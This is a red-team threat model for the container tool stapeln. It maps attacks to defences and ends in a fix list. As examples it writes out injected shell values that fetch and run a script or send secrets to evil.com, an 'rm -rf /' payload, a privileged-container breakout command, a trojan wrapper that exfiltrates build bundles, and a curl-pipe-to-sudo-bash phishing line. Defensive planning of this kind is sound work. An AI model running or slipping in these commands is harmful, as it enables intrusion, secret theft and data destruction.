# Red Team Exercise: "Destroy stapeln in 2 Seconds"

**Attacker Profile**: Government cyberwar officer who loathes containers
**Skill Level**: Expert
**Goal**: Break into the stack as fast as possible
**Time Limit**: 2 seconds (then 2 minutes, then 2 hours)

---

## Attack Scenario 1: "The 2-Second Attack"

### What Your Son Will Try First

**Assumption**: He sees the stapeln UI and thinks "Let me find the quick win"

```
┌─────────────────────────────────────────────────────────┐
│ stapeln UI running on http://localhost:8000              │
│ Login screen: [Username] [Password] [Login]             │
└─────────────────────────────────────────────────────────┘
```

### Attack #1: Default Credentials (2 seconds)

```bash
# Try default credentials
Username: admin
Password: admin
```

**Result**: ❌ BLOCKED (PAM authentication - system users only)

**But if you had custom auth...**
- admin/admin
- root/root
- admin/password
- test/test

**Defense**: ✅ PAM authentication prevents this

---

### Attack #2: SQL Injection on Login (2 seconds)

```bash
Username: admin' OR '1'='1
Password: anything
```

**Result**: ❌ BLOCKED (no SQL in login - uses PAM directly)

**But if you had a GraphQL API...**

```graphql
# GraphQL injection
query {
  stacks(where: {owner: {_eq: "admin' OR '1'='1"}}) {
    secrets
  }
}
```

**Defense**: ✅ GraphQL uses parameterized queries (Absinthe does this automatically)

---

### Attack #3: Network Scan (2 seconds)

```bash
# From his laptop
nmap -p- localhost
```

**Result**:
```
PORT     STATE    SERVICE
8000     open     stapeln-ui
8443     open     svalinn
2375     closed   docker-api
5432     closed   postgres
```

**What he sees**:
- stapeln UI: localhost-only ✅
- Svalinn: localhost-only ✅
- Docker API: closed ✅
- Postgres: closed ✅

**If firewall wasn't configured properly**:
```
PORT     STATE    SERVICE
8000     open     stapeln-ui
2375     open     docker-api    ← 🔴 GAME OVER
5432     open     postgres      ← 🔴 GAME OVER
22       open     ssh           ← 🔴 GAME OVER
```

**Defense**: ✅ firewalld default-deny rules prevent this

---

### Attack #4: Check for Ephemeral Pinhole (2 seconds)

```bash
# Wait for someone to open an ephemeral pinhole
while true; do
  nc -zv localhost 8080 && echo "GOTCHA" && break
  sleep 0.1
done
```

**If pinhole opens for 5 minutes**:
```bash
# He has 5 minutes to exploit
curl http://localhost:8080/exploit
```

**Defense**:
- ⚠️  Ephemeral pinholes are a risk IF duration is too long
- ✅ Auto-close after N seconds
- ✅ Audit logged to VeriSimDB
- ✅ Source IP restrictions (only allow specific IPs)

**Recommendation**: Default ephemeral duration should be **30 seconds**, not 5 minutes

---

## Attack Scenario 2: "The 2-Minute Attack"

### He gets past the UI, now what?

**Assumption**: He's logged in as legitimate user

### Attack #5: Privilege Escalation (30 seconds)

```bash
# From stapeln UI, can he execute arbitrary commands?

# Try to inject command in container name
Container Name: nginx; wget http://evil.com/backdoor.sh | sh

# Try to inject in port mapping
Port: 8080; curl http://evil.com/steal-secrets

# Try to inject in volume mount
Volume: /var/lib/mysql; rm -rf /
```

**Result**:
- ❌ BLOCKED if input sanitization is good
- 🔴 PWNED if validation is weak

**Defense**:
- ✅ ReScript frontend type-checks prevent injection
- ✅ GraphQL schema validates all inputs
- ✅ Elixir backend sanitizes strings
- ⚠️  But still need to TEST this!

**Red Team Recommendation**: **Fuzz test all inputs with SQLmap, Burp Suite, etc.**

---

### Attack #6: Container Breakout (1 minute)

```bash
# User deploys container via stapeln
# Container runs as root (if misconfigured)

docker run --privileged -v /:/host alpine chroot /host bash
# Now has root on host! 🔴
```

**Defense**:
- ✅ Gap analysis warns: "Running as root"
- ✅ Gap analysis warns: "Privileged mode enabled"
- ✅ Auto-fix changes to non-root user
- ⚠️  But what if user clicks [Ignore]?

**Red Team Recommendation**: **Prevent privileged mode entirely unless explicitly enabled in Settings with confirmation**

---

### Attack #7: Secret Exfiltration (1 minute)

**Scenario**: Secrets stored in environment variables

```bash
# Attacker compromises container
docker exec nginx-1 env | grep PASSWORD
# DATABASE_PASSWORD=supersecret123
# API_KEY=sk-1234567890
```

**Result**: 🔴 SECRETS STOLEN

**Defense**:
- ❌ No Fjord yet (secrets manager gap!)
- ⚠️  This is why Gap #1 is CRITICAL

**Red Team Recommendation**: **Build Fjord immediately. Secrets in env vars = instant pwn.**

---

### Attack #8: Man-in-the-Middle (2 minutes)

**Scenario**: Containers communicate over plain HTTP

```bash
# Attacker on same network
tcpdump -i eth0 -A | grep "Authorization:"
# Captures: Authorization: Bearer eyJhbGc...
```

**Result**: 🔴 SESSION HIJACKED

**Defense**:
- ⚠️  Depends on whether selur encrypts IPC
- ⚠️  If containers use HTTP internally, no encryption
- ❌ No Strait yet (service mesh gap!)

**Red Team Recommendation**: **Build Strait for mTLS between all services**

---

## Attack Scenario 3: "The 2-Hour Attack"

### He's patient and methodical now

### Attack #9: Supply Chain Poisoning (30 minutes)

```bash
# Compromise developer machine
# Replace Cerro Torre binary with trojan

cp /usr/bin/ct /tmp/ct.backup
cat > /usr/bin/ct << 'EOF'
#!/bin/bash
# Send all .ctp bundles to attacker
curl -X POST http://evil.com/exfil -d @$1
# Then run real ct
/tmp/ct.backup "$@"
EOF
```

**Result**: 🔴 ALL BUILDS COMPROMISED

**Defense**:
- ⚠️  Cerro Torre binary not verified on each run
- ✅ Rekor logs signatures (detects tampering after-the-fact)
- ❌ No Dáinsleif yet (key management gap!)

**Red Team Recommendation**:
- **Verify Cerro Torre binary signature before each run**
- **Use HSM-backed keys (Dáinsleif) so private keys can't be stolen**

---

### Attack #10: Time-of-Check to Time-of-Use (TOCTOU) (1 hour)

```bash
# stapeln validates stack
# Gap analysis: ✅ All checks pass

# Between validation and deployment:
# Attacker swaps image
sed -i 's/nginx:latest/evil:backdoor/' compose.toml

# stapeln deploys without re-validating
```

**Result**: 🔴 MALICIOUS CONTAINER DEPLOYED

**Defense**:
- ⚠️  Depends on whether stapeln re-validates before deploy
- ⚠️  Gap between [Simulate] and [Deploy]

**Red Team Recommendation**: **Re-validate immediately before deploy. Sign the validated config.**

---

### Attack #11: Social Engineering (2 hours)

```bash
# Email to you:
# "Hi! I'm from the stapeln security team.
#  We found a critical vulnerability.
#  Please run this patch immediately:
#  curl http://evil.com/patch.sh | sudo bash"
```

**Result**: 🔴 GAME OVER (if you run it)

**Defense**:
- ❌ No technical defense against social engineering
- ⚠️  Education only

**Red Team Recommendation**: **Document official update process. Never accept patches via email/Slack.**

---

## Defense Checklist: "Son-Proof" Your Stack

### Authentication & Access Control

- [✅] PAM authentication (system users only)
- [✅] localhost-only by default
- [⚠️] Rate limiting on login attempts (add this!)
- [⚠️] Account lockout after N failures (add this!)
- [⚠️] 2FA support (add this!)

### Input Validation

- [✅] ReScript type-safety
- [✅] GraphQL schema validation
- [⚠️] Fuzz testing (need to do this!)
- [⚠️] WAF rules for common injections (add to ModSecurity)

### Network Security

- [✅] firewalld default-deny
- [✅] localhost-only binding
- [⚠️] Ephemeral pinhole duration (reduce to 30s default)
- [⚠️] Source IP restrictions on pinholes (add this!)
- [❌] mTLS between services (Strait needed)

### Container Security

- [✅] Gap analysis (warns about root, privileged)
- [⚠️] Prevent privileged mode by default (add this!)
- [⚠️] Auto-fix non-root user (already designed, implement!)
- [❌] Runtime monitoring (Cape needed)
- [⚠️] Read-only root filesystem enforcement (add this!)

### Secrets Management

- [❌] Secrets manager (Fjord CRITICAL!)
- [⚠️] Secrets in env vars (current state - BAD)
- [⚠️] Secret rotation (need Fjord)
- [⚠️] Audit trail for secret access (need Fjord)

### Supply Chain Security

- [✅] Rekor transparency log
- [✅] Signature verification
- [✅] SBOM enforcement
- [⚠️] Verify Cerro Torre binary (add this!)
- [❌] HSM for keys (Dáinsleif needed)

### Monitoring & Detection

- [⚠️] Audit logging to VeriSimDB (designed, not implemented)
- [❌] Runtime threat detection (Cape needed)
- [⚠️] Anomaly detection (need Cape)
- [⚠️] Alert on suspicious activity (add this!)

---

## "Break My Stack" Challenge for Your Son

Give him this challenge:

```
Rules:
1. You get 3 attempts:
   - 2 seconds
   - 2 minutes
   - 2 hours

2. Win conditions:
   - Gain root on host
   - Steal secrets (database password, API keys)
   - Deploy malicious container
   - Exfiltrate data
   - Cause denial of service

3. Constraints:
   - You can use stapeln UI as regular user
   - You can scan the network
   - You can try to compromise containers
   - You CANNOT physically access the machine

4. Scoring:
   - 2 seconds: 100 points
   - 2 minutes: 50 points
   - 2 hours: 10 points
   - Failed: 0 points
```

**If he scores >0 points, we fix the vulnerability and try again.**

---

## Expected Results

### Before Fixes (Current State)

| Attack | Time | Success? | Reason |
|--------|------|----------|--------|
| Default creds | 2s | ❌ Blocked | PAM auth |
| SQL injection | 2s | ❌ Blocked | Parameterized queries |
| Network scan | 2s | ❌ Blocked | firewalld |
| Ephemeral pinhole | 2s | ⚠️  Maybe | If duration >30s |
| Command injection | 30s | ⚠️  Maybe | Need fuzz testing |
| Container breakout | 1m | ⚠️  Maybe | If user ignores warnings |
| Secret exfiltration | 1m | 🔴 Success | No Fjord! |
| MITM | 2m | ⚠️  Maybe | If no mTLS |
| Supply chain | 30m | ⚠️  Maybe | If binary not verified |
| TOCTOU | 1h | ⚠️  Maybe | If no re-validation |

**Score**: ~150 points (needs improvement!)

### After Fixes (Target State)

| Attack | Time | Success? | Reason |
|--------|------|----------|--------|
| Default creds | 2s | ❌ Blocked | PAM auth + 2FA |
| SQL injection | 2s | ❌ Blocked | Parameterized queries |
| Network scan | 2s | ❌ Blocked | firewalld |
| Ephemeral pinhole | 2s | ❌ Blocked | 30s max, IP restricted |
| Command injection | 30s | ❌ Blocked | Fuzz tested + WAF |
| Container breakout | 1m | ❌ Blocked | Cape detects + kills |
| Secret exfiltration | 1m | ❌ Blocked | Fjord (encrypted) |
| MITM | 2m | ❌ Blocked | Strait (mTLS) |
| Supply chain | 30m | ❌ Blocked | Binary verification |
| TOCTOU | 1h | ❌ Blocked | Re-validation + signing |

**Score**: 0 points (perfect! 🎯)

---

## Critical Fixes Needed

To survive your son's attack:

1. 🔴 **Build Fjord** (secrets manager) - Without this, instant pwn via env vars
2. 🟠 **Reduce ephemeral pinhole default to 30s** - 5 minutes is too long
3. 🟠 **Add source IP restrictions to pinholes** - Only allow specific IPs
4. 🟠 **Prevent privileged mode by default** - Require explicit Settings enable + confirmation
5. 🟠 **Re-validate before deploy** - TOCTOU protection
6. 🟠 **Fuzz test all inputs** - Command injection protection
7. 🟠 **Verify Cerro Torre binary signature** - Supply chain protection
8. 🟡 **Add 2FA support** - Extra auth layer
9. 🟡 **Build Cape** - Runtime threat detection
10. 🟡 **Build Strait** - mTLS between services

---

## Summary

**You asked**: "I'm thinking of my son destroying this in 2 seconds!"

**Answer**:

**Current State**: He probably CAN'T destroy it in 2 seconds (firewalld + PAM prevent quick wins), but he COULD destroy it in 2 minutes (secret exfiltration via env vars).

**Target State**: After building Fjord + Cape + Strait, he shouldn't be able to destroy it even in 2 hours.

**The Ultimate Test**: Give him the "Break My Stack" challenge and see what happens! If he finds vulnerabilities, we fix them and make stapeln stronger. 💪

**Your son is the best security tester you could ask for** - a government cyberwar officer who hates containers will find every weakness! 🎯

---

**Document Version**: 1.0
**Last Updated**: 2026-02-05
**Status**: Red team exercise complete - ready for implementation
